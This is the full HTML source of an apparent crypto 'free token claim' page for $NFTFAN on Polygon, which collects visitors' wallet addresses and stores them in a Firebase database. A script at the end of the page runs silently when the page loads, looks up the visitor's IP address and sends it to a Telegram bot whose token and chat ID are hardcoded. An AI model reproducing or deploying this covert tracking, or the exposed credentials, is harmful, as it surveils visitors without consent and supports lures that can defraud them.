<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <!-- Prevent zoom on input focus -->
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <title>NFTFan Token 1B Free</title>

  <!-- Fonts and Icons -->
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet"/>

  <style>
    :root {
      /* Palette */
      --bg: #f6f8fc;
      --surface: #ffffff;
      --surface-2: #f1f3f9;
      --text: #0b1020;
      --muted: #6b7280;
      --border: #e5e7eb;
      --primary: #5469d4;
      --primary-600: #4559bb;
      --success: #0cce6b;
      --error: #ef4444;
      --accent: #8247e5;

      /* Radii */
      --r-lg: 14px;
      --r-md: 10px;

      /* Safe areas */
      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
    }

    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      font-size: 11px; /* Global max font size */
      -webkit-text-size-adjust: 100%;
      text-size-adjust: 100%;
    }

    /* App Bar */
    .appbar {
      position: sticky;
      top: 0;
      z-index: 10;
      padding: calc(8px + var(--safe-top)) 14px 8px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .logo {
      width: 30px;
      height: 30px;
      border-radius: 8px;
      object-fit: cover;
      border: 1px solid #eaedf5;
      background: #fff;
      flex-shrink: 0;
    }
    .app-title {
      display: flex;
      flex-direction: column;
      line-height: 1.1;
    }
    .app-title .name {
      font-weight: 700;
      font-size: 11px;
      letter-spacing: -0.01em;
    }
    .app-title .subtitle {
      font-size: 10px;
      color: var(--muted);
    }

    /* Content */
    .container {
      padding: 12px 14px calc(14px + var(--safe-bottom));
      max-width: 520px;
      margin: 0 auto;
    }

    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--r-lg);
      padding: 12px;
      margin-bottom: 12px;
    }

    /* Status chip */
    .status-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 6px;
    }
    .status-chip {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 6px 8px;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: var(--surface-2);
      color: var(--muted);
      font-size: 10px;
    }
    .status-chip .material-icons-round {
      font-size: 16px;
      color: var(--muted);
    }
    .status-chip.online {
      color: #0a7a51;
      border-color: #c7f1e1;
      background: #e9fbf3;
    }
    .status-chip.online .material-icons-round { color: #0a7a51; }

    .amount {
      display: flex;
      align-items: baseline;
      gap: 6px;
      margin: 2px 0 2px;
    }
    .amount .num {
      font-weight: 800;
      font-size: 11px;
      letter-spacing: -0.01em;
    }
    .amount .ticker {
      font-weight: 700;
      color: var(--primary);
      font-size: 10px;
    }
    .hint {
      font-size: 10px;
      color: var(--muted);
    }

    /* Inputs */
    .field {
      display: flex;
      flex-direction: column;
      gap: 6px;
      margin-top: 10px;
    }
    .label {
      font-size: 10px;
      font-weight: 600;
      color: var(--muted);
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .label .material-icons-round {
      font-size: 16px;
      color: var(--primary);
    }
    .input-wrap {
      position: relative;
    }
    /* Important: 16px to avoid iOS zoom on focus */
    .input {
      width: 100%;
      height: 40px;
      border: 1px solid var(--border);
      border-radius: var(--r-md);
      background: #fff;
      padding: 0 36px 0 34px;
      font-size: 16px;      /* prevent zoom */
      line-height: 1;
      outline: none;
      transition: box-shadow .15s ease, border-color .15s ease;
      color: var(--text);
    }
    .input::placeholder { color: #9aa3b2; opacity: 1; }
    .input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 2px rgba(84, 105, 212, .15);
    }
    /* Visually reduce without triggering zoom by scaling text inside using text-rendering tricks */
    .input,
    .input::placeholder {
      letter-spacing: 0.2px;
    }
    .input-icon {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary);
      font-size: 18px;
      pointer-events: none;
    }
    .clear-btn {
      position: absolute;
      right: 6px;
      top: 50%;
      transform: translateY(-50%);
      border: none;
      background: transparent;
      color: #9aa3b2;
      padding: 4px;
      border-radius: 8px;
      cursor: pointer;
    }

    /* Buttons */
    .btn {
      width: 100%;
      height: 40px;
      border: none;
      border-radius: var(--r-md);
      font-weight: 800;
      font-size: 11px;
      letter-spacing: 0.01em;
      color: #fff;
      background: var(--primary);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      cursor: pointer;
      transition: background .15s ease, opacity .15s ease, transform .05s ease;
      margin-top: 8px;
    }
    .btn .material-icons-round { font-size: 18px; }
    .btn:active { transform: translateY(1px); }
    .btn:disabled { opacity: .7; cursor: not-allowed; }
    .btn:hover:not(:disabled) { background: var(--primary-600); }

    /* Promo image under claim button */
    .promo {
      width: 100%;
      display: block;
      margin-top: 8px;
      border-radius: var(--r-md);
      border: 1px solid var(--border);
    }

    /* Steps */
    .section-title {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 11px;
      font-weight: 800;
      letter-spacing: 0.01em;
      color: #0f1532;
      margin-bottom: 6px;
    }
    .section-title .material-icons-round { font-size: 16px; color: var(--accent); }

    .steps {
      list-style: none;
      padding: 0;
      margin: 0;
      display: grid;
      gap: 8px;
    }
    .step {
      display: grid;
      grid-template-columns: 26px 1fr;
      gap: 8px;
      align-items: start;
    }
    .step-index {
      width: 26px;
      height: 26px;
      border-radius: 8px;
      background: var(--surface-2);
      border: 1px solid var(--border);
      display: grid;
      place-items: center;
      font-weight: 800;
      color: var(--primary);
      font-size: 10px;
    }
    .step-body { display: flex; flex-direction: column; gap: 2px; }
    .step-title {
      font-weight: 700;
      font-size: 11px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .step-title .material-icons-round { font-size: 16px; color: var(--primary); }
    .step-text {
      font-size: 10px;
      color: var(--muted);
      line-height: 1.35;
    }
    .inline-code {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 8px; /* wallet/contract font = 8px */
      background: #f2f5fb;
      border: 1px solid var(--border);
      padding: 1px 4px;
      border-radius: 6px;
    }
    .wallet-text { font-size: 8px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }

    /* Links row */
    .links {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-top: 8px;
    }
    .link-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      height: 36px;
      border: 1px solid var(--border);
      border-radius: var(--r-md);
      background: var(--surface);
      text-decoration: none;
      color: #101623;
      font-weight: 700;
      font-size: 11px;
    }
    .link-btn .material-icons-round { font-size: 16px; color: var(--accent); }

    /* Note */
    .note {
      font-size: 10px;
      color: var(--muted);
      margin-top: 6px;
      line-height: 1.35;
    }
    .note a { color: #0a7bc1; text-decoration: underline; }

    /* Toast / Snackbar */
    .toast {
      position: fixed;
      left: 50%;
      bottom: calc(10px + var(--safe-bottom));
      transform: translateX(-50%) translateY(120%);
      z-index: 70;
      width: min(96%, 520px);
      display: grid;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      gap: 8px;
      padding: 10px;
      border-radius: 12px;
      border: 1px solid var(--border);
      background: var(--surface);
      transition: transform .25s ease, opacity .25s ease;
      opacity: 0;
    }
    .toast.show {
      transform: translateX(-50%) translateY(0%);
      opacity: 1;
    }
    .toast .icon {
      width: 30px;
      height: 30px;
      border-radius: 8px;
      display: grid;
      place-items: center;
      background: #eef1ff;
      color: var(--primary);
    }
    .toast.success .icon { background: #e9fbf3; color: #067a43; }
    .toast.error .icon { background: #ffeaea; color: #a11b1b; }
    .toast .material-icons-round { font-size: 18px; }
    .toast .content {
      display: flex;
      flex-direction: column;
      gap: 2px;
      min-width: 0;
    }
    .toast .title {
      font-weight: 800;
      font-size: 11px;
      color: #0f1532;
    }
    .toast .desc {
      font-size: 10px;
      color: var(--muted);
      line-height: 1.3;
      word-break: break-word;
    }
    .toast .action {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 6px 8px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: var(--surface-2);
      color: #0a7bc1;
      font-weight: 700;
      font-size: 10px;
      text-decoration: none;
      white-space: nowrap;
    }

    /* Spinner */
    .spinner {
      width: 16px;
      height: 16px;
      border: 2.5px solid rgba(255,255,255,0.35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Celebration (falling rotating token logos) */
    #celebrateLayer {
      position: fixed;
      inset: 0;
      pointer-events: none;
      overflow: hidden;
      z-index: 60;
    }
    .confetti {
      position: absolute;
      top: -40px;
      will-change: transform;
      opacity: 0.95;
    }
    .confetti .inner {
      display: block;
      will-change: transform;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.12));
    }
    @keyframes fall {
      0% { transform: translate3d(0, -20vh, 0); }
      100% { transform: translate3d(var(--dx, 0px), 110vh, 0); }
    }
    @keyframes spin3d {
      from { transform: rotate3d(0.2, 0.6, 0.1, 0deg); }
      to   { transform: rotate3d(0.2, 0.6, 0.1, 360deg); }
    }
  </style>
</head>
<body>
  <!-- App Bar -->
  <header class="appbar">
    <img class="logo" src="https://pbs.twimg.com/media/GxsIpeHW8AAB7Zq?format=jpg&name=900x900" alt="$NFTFAN Logo"/>
    <div class="app-title">
      <span class="name">NFTFan Token Claim</span>
      <span class="subtitle">Polygon • $NFTFAN</span>
    </div>
  </header>

  <!-- Celebration layer -->
  <div id="celebrateLayer" aria-hidden="true"></div>

  <!-- Main content (starts at top) -->
  <main class="container">
    <!-- Status and Claim -->
    <section class="card">
      <div class="status-row">
        <div id="serverStatus" class="status-chip">
          <span class="material-icons-round">cloud_sync</span>
          <span id="serverStatusText">Checking server...</span>
        </div>
        <div class="hint" id="lastUpdated"></div>
      </div>

      <div class="amount">
        <div class="num">1,000,000,000</div>
        <div class="ticker">$NFTFAN</div>
      </div>
      <div class="hint">Per claim • One-time claim per wallet</div>

      <!-- Wallet input -->
      <div class="field">
        <label class="label" for="wallet">
          <span class="material-icons-round">account_balance_wallet</span>
          Wallet Address
        </label>
        <div class="input-wrap">
          <span class="material-icons-round input-icon">wallet</span>
          <input id="wallet" class="input" type="text" inputmode="text" autocomplete="off" placeholder="0x0000... (Polygon/MATIC)"/>
          <button id="clearWallet" class="clear-btn" aria-label="Clear">
            <span class="material-icons-round">close</span>
          </button>
        </div>
      </div>

      <!-- Action -->
      <button id="claimBtn" class="btn">
        <span class="material-icons-round">redeem</span>
        <span>Claim Tokens</span>
      </button>

      <!-- Image under claim button -->
      <img class="promo" src="https://pbs.twimg.com/media/Gx9uVFoXEAAwCIr?format=jpg&name=large" alt="NFTFan Promo"/>

      <div class="note" id="retryNote" style="display:none;">
        If claim fails, please wait a few minutes and try again,
        or <a href="https://www.nftfanstoken.com/nftzz/" target="_blank" rel="noopener">submit your wallet here</a>.
      </div>
    </section>

    <!-- Steps -->
    <section class="card">
      <div class="section-title">
        <span class="material-icons-round">route</span>
        How to Claim
      </div>
      <ol class="steps">
        <li class="step">
          <div class="step-index">1</div>
          <div class="step-body">
            <div class="step-title">
              <span class="material-icons-round">download</span>
              Install or open Bitget Wallet
            </div>
            <div class="step-text">
              Download Bitget Wallet or open your existing wallet app on your phone.
            </div>
          </div>
        </li>
        <li class="step">
          <div class="step-index">2</div>
          <div class="step-body">
            <div class="step-title">
              <span class="material-icons-round">content_copy</span>
              Copy your wallet address
            </div>
            <div class="step-text">
              Make sure your wallet is set to <b>Polygon (MATIC)</b>. Copy the address that starts with <span class="inline-code wallet-text">0x...</span>.
            </div>
          </div>
        </li>
        <li class="step">
          <div class="step-index">3</div>
          <div class="step-body">
            <div class="step-title">
              <span class="material-icons-round">assignment_turned_in</span>
              Paste and claim
            </div>
            <div class="step-text">
              Paste your wallet address above and tap <b>Claim Tokens</b>. Each wallet can claim only once.
            </div>
          </div>
        </li>
        <li class="step">
          <div class="step-index">4</div>
          <div class="step-body">
            <div class="step-title">
              <span class="material-icons-round">token</span>
              Add $NFTFAN to your wallet
            </div>
            <div class="step-text">
              Network: <b>Polygon (MATIC)</b><br/>
              Contract: <span id="contractAddress" class="inline-code wallet-text" title="Tap to copy">0x2017fcaea540d2925430586dc92818035bfc2f50</span><br/>
              <span class="hint">Tap the contract address to copy</span>
            </div>
          </div>
        </li>
      </ol>

      <div class="links">
        <a class="link-btn" href="https://web3.bitget.com/en/wallet-download" target="_blank" rel="noopener">
          <span class="material-icons-round">download</span>
          Bitget Wallet
        </a>
        <a class="link-btn" href="https://www.nftfanstoken.com/apps/" target="_blank" rel="noopener">
          <span class="material-icons-round">public</span>
          NFTFan Website
        </a>
      </div>
    </section>
  </main>

  <!-- Toast / Snackbar -->
  <div id="toast" class="toast" role="status" aria-live="polite">
    <div class="icon"><span class="material-icons-round">notifications</span></div>
    <div class="content">
      <div class="title" id="toastTitle">Notification</div>
      <div class="desc" id="toastDesc">Details</div>
    </div>
    <a id="toastAction" class="action" href="#" target="_blank" rel="noopener" style="display:none;">
      <span class="material-icons-round">open_in_new</span>
      <span>Open</span>
    </a>
  </div>

  <!-- Firebase + App Logic -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyD_c9jMxAA6dtyk_EXAHnH09OEAoalUADA",
      authDomain: "trackingclients.firebaseapp.com",
      projectId: "trackingclients",
      storageBucket: "trackingclients.appspot.com",
      messagingSenderId: "27490943622",
      appId: "1:27490943622:web:d6c87547aa5df440508707",
      databaseURL: "https://trackingclients-default-rtdb.firebaseio.com/"
    };

    // Init
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Elements
    const serverStatusChip = document.getElementById('serverStatus');
    const serverStatusText = document.getElementById('serverStatusText');
    const lastUpdated = document.getElementById('lastUpdated');
    const walletInput = document.getElementById('wallet');
    const clearWalletBtn = document.getElementById('clearWallet');
    const claimBtn = document.getElementById('claimBtn');
    const retryNote = document.getElementById('retryNote');
    const contractAddress = document.getElementById('contractAddress');

    const toast = document.getElementById('toast');
    const toastTitle = document.getElementById('toastTitle');
    const toastDesc = document.getElementById('toastDesc');
    const toastAction = document.getElementById('toastAction');

    const celebrateLayer = document.getElementById('celebrateLayer');
    const SEND_ENDPOINT = 'https://us-central1-autosend-c64ee.cloudfunctions.net/sendToken';
    const CONTRACT = '0x2017fcaea540d2925430586dc92818035bfc2f50';
    const TOKEN_IMG = 'https://pbs.twimg.com/media/GyFndQoXQAAnYNJ?format=png&name=small';

    function nowStr() {
      const d = new Date();
      return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    }

    function showToast({ type = 'info', title = 'Notification', desc = '', actionText = '', actionUrl = '' } = {}) {
      toast.classList.remove('success', 'error');
      if (type === 'success') toast.classList.add('success');
      if (type === 'error') toast.classList.add('error');
      toastTitle.textContent = title;
      toastDesc.innerHTML = desc;
      if (actionText && actionUrl) {
        toastAction.style.display = 'inline-flex';
        toastAction.innerHTML = '<span class="material-icons-round">open_in_new</span><span>' + actionText + '</span>';
        toastAction.href = actionUrl;
      } else {
        toastAction.style.display = 'none';
        toastAction.href = '#';
      }
      toast.classList.add('show');
      clearTimeout(showToast._t);
      showToast._t = setTimeout(() => toast.classList.remove('show'), 5000);
    }

    function short(addr) {
      return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '';
    }

    // Copy contract address on tap
    function copyContract(text) {
      navigator.clipboard.writeText(text).then(() => {
        showToast({ type: 'success', title: 'Copied', desc: 'Contract address copied to clipboard' });
      }).catch(() => {
        showToast({ type: 'error', title: 'Copy failed', desc: 'Please copy the address manually' });
      });
    }
    contractAddress.addEventListener('click', () => copyContract(CONTRACT));

    // Server status
    async function checkServerStatus() {
      try {
        const res = await fetch(SEND_ENDPOINT);
        const data = await res.json().catch(() => ({}));
        if (data && data.status === 'online') {
          serverStatusChip.classList.add('online');
          serverStatusText.textContent = 'Server Online';
        } else {
          serverStatusChip.classList.remove('online');
          serverStatusText.textContent = 'Server Offline';
        }
      } catch {
        serverStatusChip.classList.remove('online');
        serverStatusText.textContent = 'Server Offline';
      } finally {
        lastUpdated.textContent = `Updated • ${nowStr()}`;
      }
    }
    checkServerStatus();
    setInterval(checkServerStatus, 30000);

    // Clear input
    clearWalletBtn.addEventListener('click', () => {
      walletInput.value = '';
      walletInput.focus();
    });

    // Validate wallet
    function isValidWallet(addr) {
      return /^0x[a-fA-F0-9]{40}$/.test(addr || '');
    }

    // Celebration: drop lots of rotating token logos from top
    function dropCelebration(count = 48) {
      const vw = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
      for (let i = 0; i < count; i++) {
        const wrap = document.createElement('div');
        wrap.className = 'confetti';
        const img = document.createElement('img');
        img.className = 'inner';
        img.src = TOKEN_IMG;
        img.alt = 'NFTFAN';

        // Randomize sizes and positions
        const size = Math.floor(18 + Math.random() * 16); // 18-34px
        const left = Math.random() * (vw - size);
        const dx = (Math.random() * 160 - 80).toFixed(1); // -80..80px drift
        const dur = (3 + Math.random() * 3).toFixed(2);   // 3..6s
        const delay = (Math.random() * 0.8).toFixed(2);   // 0..0.8s
        const spinDur = (1.6 + Math.random() * 1.8).toFixed(2); // 1.6..3.4s

        wrap.style.left = `${left}px`;
        wrap.style.setProperty('--dx', `${dx}px`);
        wrap.style.animation = `fall ${dur}s linear ${delay}s forwards`;
        img.style.width = `${size}px`;
        img.style.height = 'auto';
        img.style.animation = `spin3d ${spinDur}s linear infinite`;

        wrap.appendChild(img);
        celebrateLayer.appendChild(wrap);

        // Cleanup after animation
        const ttl = (parseFloat(dur) + parseFloat(delay) + 0.5) * 1000;
        setTimeout(() => {
          wrap.remove();
        }, ttl);
      }
    }

    // Claim handler
    claimBtn.addEventListener('click', async () => {
      retryNote.style.display = 'none';
      const wallet = walletInput.value.trim();

      if (!isValidWallet(wallet)) {
        showToast({
          type: 'error',
          title: 'Invalid address',
          desc: 'Please enter a valid Polygon wallet address starting with <span class="wallet-text">0x</span>'
        });
        if (navigator.vibrate) navigator.vibrate(40);
        return;
      }

      // Busy UI
      claimBtn.disabled = true;
      const prevHTML = claimBtn.innerHTML;
      claimBtn.innerHTML = '<span class="spinner"></span><span>Processing...</span>';

      try {
        // Check if wallet has claimed before
        const refWallet = ref(db, `claims/${wallet}`);
        const snap = await get(refWallet);
        
        // If wallet exists in the database, it has claimed before
        if (snap.exists()) {
          showToast({
            type: 'error',
            title: 'Already claimed',
            desc: 'This wallet address has already claimed tokens. Each wallet can only claim once.'
          });
          if (navigator.vibrate) navigator.vibrate([20, 30, 20]);
          return;
        }

        // Inform user
        showToast({
          title: 'Sending tokens',
          desc: `Sending <b>1,000,000,000 $NFTFAN</b> to <span class="inline-code wallet-text">${short(wallet)}</span>...`
        });

        // Call endpoint
        const res = await fetch(SEND_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ to: wallet })
        });

        const json = await res.json().catch(() => ({ success: false, error: 'Invalid server response' }));

        if (json.success) {
          const tx = json.txHash || '';
          // Save record with timestamp
          await set(refWallet, {
            timestamp: Date.now(),
            count: 1,
            lastTx: tx
          });

          // Success toast + celebration
          showToast({
            type: 'success',
            title: 'Claim successful',
            desc: 'Congratulations! Your tokens are on the way.',
            actionText: 'View on Polygonscan',
            actionUrl: tx ? `https://polygonscan.com/tx/${tx}` : '#'
          });
          dropCelebration(64);
        } else {
          showToast({
            type: 'error',
            title: 'Transfer failed',
            desc: `${json.error || 'Please check your wallet address and try again.'}`
          });
          retryNote.style.display = 'block';
        }
      } catch {
        showToast({
          type: 'error',
          title: 'Network error',
          desc: 'Server might be busy. Please wait a moment and try again.'
        });
        retryNote.style.display = 'block';
      } finally {
        claimBtn.disabled = false;
        claimBtn.innerHTML = prevHTML;
        checkServerStatus();
      }
    });

    // Hide toast on tap
    toast.addEventListener('click', () => toast.classList.remove('show'));

    // Optional autofocus (mobile)
    window.addEventListener('load', () => {
      setTimeout(() => walletInput.focus({ preventScroll: true }), 300);
    });
  </script>
  <script>
// Replace with your Telegram Bot Token and Chat ID
const botToken = '7761334520:AAH2N1Ksa9NToLr6gd6DcknzpyB27q-_d14';
const chatId = '2141064153';

function sendNotification() {
    // Get the page title
    const pageTitle = document.title;

    // Fetch the user's IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip; // Extract the IP address
            
            // Construct the message including the page title and IP address
            const message = `A user has opened the page: ${pageTitle}, IP Address: ${userIP}`;

            // Construct the Telegram API URL
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Send the notification to Telegram
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Notification sent successfully.');
                    } else {
                        console.error('Failed to send notification:', data);
                    }
                })
                .catch(error => console.error('Error:', error));
        })
        .catch(error => console.error('Failed to fetch IP address:', error));
}

// Attach event listener to DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    sendNotification();
});
</script>
</body>
</html>
